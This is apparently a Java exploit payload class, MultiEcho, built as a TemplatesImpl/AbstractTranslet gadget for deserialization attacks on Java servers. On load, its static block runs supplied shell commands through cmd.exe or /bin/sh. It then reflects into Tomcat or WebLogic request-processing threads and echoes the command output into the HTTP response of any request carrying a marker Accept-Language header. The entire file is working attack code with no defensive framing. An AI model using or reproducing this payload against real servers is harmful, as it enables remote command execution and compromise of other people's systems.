package payload;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.lang.reflect.Field;
import java.util.List;
import java.util.Scanner;

public class MultiEcho extends AbstractTranslet {

    static String action = "actionVal";
    static String postion = "postionVal";
    static String param = "paramVal";
    static String headerKeyAu = "Accept-Language";
    static String headerValAu = "zh-CN,zh;q=1.9";
    static String headerKey = "headerKeyv";
    static String headerValue = "headerValuev";

    static {
        try {
            switch (action){
                case "exec":
                    switch (postion){
                        case "header":
                            String[] var12 = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", headerValue} : new String[]{"/bin/sh", "-c", headerValue};
                            headerValue = (new Scanner((new ProcessBuilder(var12)).start().getInputStream())).useDelimiter("\\A").next();
                            break;
                        case "body":
                            var12 = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", param} : new String[]{"/bin/sh", "-c", param};
                             param = (new Scanner((new ProcessBuilder(var12)).start().getInputStream())).useDelimiter("\\A").next();
                             break;
                    }
            }
        } catch (Exception var13) {
        }
        start();
    }

    private static void start(){
        try{
            Class.forName("org.apache.catalina.connector.Response");
            tomcat();
            return;
        } catch (Exception ignored){

        }
        try {
            Class.forName("weblogic.work.ExecuteThread");
            WeblogicEchoTemplate();
            return;
        } catch (Exception ignored){

        }
    }
    private static void tomcat() {
        try{
            Thread[] var5 = (Thread[])getFV(Thread.currentThread().getThreadGroup(), "threads");
            for (Thread var7 : var5) {
                if (var7 != null) {
                    String var3 = var7.getName();
                    if (!var3.contains("exec") && var3.contains("http")) {
                        Object var1 = getFV(var7, "target");
                        if (var1 instanceof Runnable) {
                            try {
                                var1 = getFV(getFV(getFV(var1, "this$0"), "handler"), "global");
                            } catch (Exception var13) {
                                continue;
                            }
                            List var9 = (List) getFV(var1, "processors");
                            for (Object var11 : var9) {
                                var1 = getFV(var11, "req");
                                Object var2 = var1.getClass().getMethod("getResponse").invoke(var1);
                                String var15 = (String) var1.getClass().getMethod("getHeader", String.class).invoke(var1, headerKeyAu);
                                if (var15 != null && var15.equals(headerValAu)) {
                                    var2.getClass().getMethod("setStatus", Integer.TYPE).invoke(var2, new Integer(200));
                                    switch (postion){
                                        case "body":
                                            writeBody(var2, param.getBytes());
                                        default:
                                            var2.getClass().getDeclaredMethod("addHeader", new Class[] { String.class, String.class }).invoke(var2, new Object[] { headerKey, headerValue });
                                    }

                                    return;
                                }
                            }
                        }
                    }
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    private static void writeBody(Object var0, byte[] var1) throws Exception {
        Object var2;
        Class var3;
        try {
            var3 = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
            var2 = var3.newInstance();
            var3.getDeclaredMethod("setBytes", byte[].class, Integer.TYPE, Integer.TYPE).invoke(var2, var1, new Integer(0), new Integer(var1.length));
            var0.getClass().getMethod("doWrite", var3).invoke(var0, var2);
        } catch (NoSuchMethodException var5) {
            var3 = Class.forName("java.nio.ByteBuffer");
            var2 = var3.getDeclaredMethod("wrap", byte[].class).invoke(var3, var1);
            var0.getClass().getMethod("doWrite", var3).invoke(var0, var2);
        }

    }

    private static Object getFV(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class var3 = var0.getClass();

        while(var3 != Object.class) {
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException var5) {
                var3 = var3.getSuperclass();
            }
        }

        if (var2 == null) {
            throw new NoSuchFieldException(var1);
        } else {
            var2.setAccessible(true);
            return var2.get(var0);
        }
    }

    public static void WeblogicEchoTemplate(){
        try{
            Object adapter = Class.forName("weblogic.work.ExecuteThread").getDeclaredMethod("getCurrentWork").invoke(Thread.currentThread());
            Object res;
            if(!adapter.getClass().getName().endsWith("ServletRequestImpl")){
                Field field = adapter.getClass().getDeclaredField("connectionHandler");
                field.setAccessible(true);
                Object obj = field.get(adapter);
                adapter = obj.getClass().getMethod("getServletRequest").invoke(obj);
            }
            String var15 = (String) adapter.getClass().getMethod("getHeader", String.class).invoke(adapter, headerKeyAu);
            if (var15 != null && var15.equals(headerValAu)) {
                switch (postion){
                    case "body":
                        res = adapter.getClass().getMethod("getResponse").invoke(adapter);
                        Object sin = Class.forName("weblogic.xml.util.StringInputStream").getConstructor(String.class).newInstance(param);
                        Object out = res.getClass().getDeclaredMethod("getServletOutputStream").invoke(res);
                        out.getClass().getDeclaredMethod("writeStream",Class.forName("java.io.InputStream")).invoke(out,sin);
                        out.getClass().getDeclaredMethod("flush").invoke(out);
                        Object w = res.getClass().getDeclaredMethod("getWriter").invoke(res);
                        w.getClass().getDeclaredMethod("write",String.class).invoke(w,"");
                    default:
                        Object rsp = adapter.getClass().getDeclaredMethod("getResponse", new Class[0]).invoke(adapter, new Object[0]);
                        rsp.getClass().getDeclaredMethod("addHeader", new Class[] { String.class, String.class }).invoke(rsp, new Object[] { headerKey, headerValue });
                }
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
